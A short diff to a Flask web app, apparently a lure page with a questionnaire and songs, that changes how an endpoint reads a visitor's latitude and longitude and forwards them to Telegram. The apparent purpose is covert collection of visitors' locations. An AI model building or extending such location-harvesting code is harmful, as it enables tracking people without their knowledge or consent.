@@ -65,16 +65,18 @@ def questionnaire():
 @app.route('/send-location', methods=['POST'])
 def send_location():
     data = request.get_json()
-    latitude = data.get('latitude')
-    longitude = data.get('longitude')
+    location_data = data.get('location', {})
+    latitude = location_data.get('latitude')
+    longitude = location_data.get('longitude')
 
     # Send location to Telegram
-    location_message = f"User 's Location:\nLatitude: {latitude}\nLongitude: {longitude}"
+    location_message = f"User  's Location:\nLatitude: {latitude}\nLongitude: {longitude}"
     send_to_telegram("Location Update", "", "", location_message, "")
     
+    print(f"Received location: Latitude = {latitude}, Longitude = {longitude}")
     
     return jsonify({"status": "success", "message": "Location sent successfully!"})
-
+    
 songs = {
     
     "bongo": ["/static/images/rayvany.mp3", "Rayvany - Bongo"],
